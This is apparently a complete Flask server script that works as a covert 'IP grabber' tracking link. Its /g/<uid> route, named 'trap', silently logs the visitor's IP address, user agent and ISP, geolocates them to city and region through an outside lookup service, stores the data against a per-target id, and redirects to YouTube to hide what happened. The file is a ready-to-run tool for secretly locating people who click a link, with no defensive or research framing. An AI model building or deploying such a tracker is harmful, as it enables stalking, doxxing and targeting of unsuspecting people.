import os, sqlite3, requests
from datetime import datetime
from flask import Flask, request, redirect

app = Flask(__name__)

DB_FILE = "hits.db"

def init_db():
    db = sqlite3.connect(DB_FILE)
    db.execute("""CREATE TABLE IF NOT EXISTS hits(
        ts TEXT, uid TEXT, ip TEXT, ua TEXT,
        city TEXT, region TEXT, country TEXT, isp TEXT)""")
    db.commit()
    return db

@app.route("/g/<uid>")
def trap(uid):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    city = region = country = isp = "—"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?lang=ru", timeout=5).json()
        if r.get("status") == "success":
            city    = r.get("city", "—")
            region  = r.get("regionName", "—")
            country = r.get("country", "—")
            isp     = r.get("isp", "—")
    except Exception:
        pass

    db = init_db()
    db.execute("INSERT INTO hits VALUES (?,?,?,?,?,?,?,?)",
               (datetime.utcnow().isoformat(), uid, ip, ua,
                city, region, country, isp))
    db.commit()
    db.close()

    return redirect("https://www.youtube.com/")

@app.route("/")
def home():
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
